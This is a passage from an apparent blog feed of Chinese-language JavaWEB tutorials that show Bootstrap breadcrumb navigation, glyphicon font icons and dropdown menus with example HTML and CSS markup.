class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-路径导航（面包屑导航）"><a href="#3-路径导航（面包屑导航）" class="headerlink" title="3.路径导航（面包屑导航）"></a>3.路径导航（面包屑导航）</h2><p>面包屑导航（Breadcrumbs）是一种基于网站层次信息的显示方式。以博客为例，面包屑导航可以显示发布日期、类别或标签。它们表示当前页面在导航层次结构内的位置。在一个带有层次的导航结构中标明当前页面的位置。各路径间的分隔符已经自动通过 CSS 的 <code>:before</code> 和 <code>content</code> 属性添加了。Bootstrap 中的面包屑导航（Breadcrumbs）是一个简单的带有 <code>.breadcrumb</code>  的无序列表。分隔符会通过 CSS（bootstrap.min.css）中所示的类自动被添加。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.breadcrumb</span> &gt; <span class="hljs-selector-tag">li</span> + <span class="hljs-selector-tag">li</span>:before &#123;<br>    color: <span class="hljs-number">#CCCCCC</span>;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;/ &quot;</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">5px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//1<br><span class="hljs-tag">&lt;<span class="hljs-name">ol</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;breadcrumb&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Library<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span>Data<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br><br>//2<br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;breadcrumb&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>2013<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span>十一月<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
      <tag>BootStrap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（二十）BootStrap-组件(一)</title>
    <link href="/2021/08/18/JavaWEB/JavaWEB-%EF%BC%88%E4%BA%8C%E5%8D%81%EF%BC%89BootStrap-%E7%BB%84%E4%BB%B6(%E4%B8%80)/"/>
    <url>/2021/08/18/JavaWEB/JavaWEB-%EF%BC%88%E4%BA%8C%E5%8D%81%EF%BC%89BootStrap-%E7%BB%84%E4%BB%B6(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<p>Bootstrap 是最受欢迎的 HTML、CSS 和 JS 框架，用于开发响应式布局、移动设备优先的 WEB 项目。Bootstrap是基于HTML、CSS、JavaScript 开发的简洁、直观、强悍的前端开发框架，使得 Web 开发更加快捷。提供了优雅的HTML和CSS规范。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-字体图标"><a href="#1-字体图标" class="headerlink" title="1.字体图标"></a>1.字体图标</h2><h3 id="1-1-用法"><a href="#1-1-用法" class="headerlink" title="1.1 用法"></a>1.1 用法</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//一<br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-search&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>//二<br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;Left Align&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-align-left&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-star&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> Star<br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>//示例<br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-sort-by-attributes&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-sort-by-attributes-alt&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-sort-by-order&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-sort-by-order-alt&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-lg&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-user&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> User<br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-sm&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-user&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> User<br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default btn-xs&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-user&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> User<br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-定制字体图标"><a href="#1-2-定制字体图标" class="headerlink" title="1.2 定制字体图标"></a>1.2 定制字体图标</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-user&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> User<br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-1-定制字体尺寸"><a href="#1-2-1-定制字体尺寸" class="headerlink" title="1.2.1 定制字体尺寸"></a>1.2.1 定制字体尺寸</h4><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-size: 60px&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-user&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> User<br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-2-定制字体颜色"><a href="#1-2-2-定制字体颜色" class="headerlink" title="1.2.2 定制字体颜色"></a>1.2.2 定制字体颜色</h4><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: rgb(212, 106, 64);&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-user&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> User<br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-3-应用文本阴影"><a href="#1-2-3-应用文本阴影" class="headerlink" title="1.2.3 应用文本阴影"></a>1.2.3 应用文本阴影</h4><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-lg&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-shadow: black 5px 3px 3px;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-user&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> User<br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-下拉菜单"><a href="#2-下拉菜单" class="headerlink" title="2.下拉菜单"></a>2.下拉菜单</h2><table><thead><tr><th align="left">类</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">.dropdown</td><td align="left">指定下拉菜单，下拉菜单都包裹在 .dropdown 里</td></tr><tr><td align="left">.dropdown-menu</td><td align="left">创建下拉菜单</td></tr><tr><td align="left">.dropdown-menu-right</td><td align="left">下拉菜单右对齐</td></tr><tr><td align="left">.dropdown-header</td><td align="left">下拉菜单中添加标题</td></tr><tr><td align="left">.dropup</td><td align="left">指定向上弹出的下拉菜单</td></tr><tr><td align="left">.disabled</td><td align="left">下拉菜单中的禁用项</td></tr><tr><td align="left">.divider</td><td align="left">下拉菜单中的分割线</td></tr></tbody></table><p>将下拉菜单触发器和下拉菜单都包裹在 <code>.dropdown</code> 里，或者另一个声明了 <code>position: relative;</code> 的元素。然后加入组成菜单的 HTML 代码。</p><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default dropdown-toggle&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dropdownMenu1&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">aria-haspopup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>    Dropdown<br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span> <span class="hljs-attr">aria-labelledby</span>=<span class="hljs-string">&quot;dropdownMenu1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Another action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Something else here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;separator&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Separated link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>通过为下拉菜单的父元素设置 <code>.dropup</code> 类，可以让菜单向上弹出（默认是向下弹出的）。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropup&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default dropdown-toggle&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dropdownMenu2&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">aria-haspopup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">aria-expanded</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br>    Dropup<br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span> <span class="hljs-attr">aria-labelledby</span>=<span class="hljs-string">&quot;dropdownMenu2&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Another action<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Something else here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;separator&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Separated link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-1-对齐"><a href="#2-1-对齐" class="headerlink" title="2.1 对齐"></a>2.1 对齐</h3><p>通过向 <code>.dropdown-menu</code> 添加 类 <code>.pull-right</code> 来向右对齐下拉菜单。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn dropdown-toggle&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dropdownMenu1&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span>主题<br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu pull-right&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menu&quot;</span> <span class="hljs-attr">aria-labelledby</span>=<span class="hljs-string">&quot;dropdownMenu1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;-1&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Java<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;-1&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>数据挖掘<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span 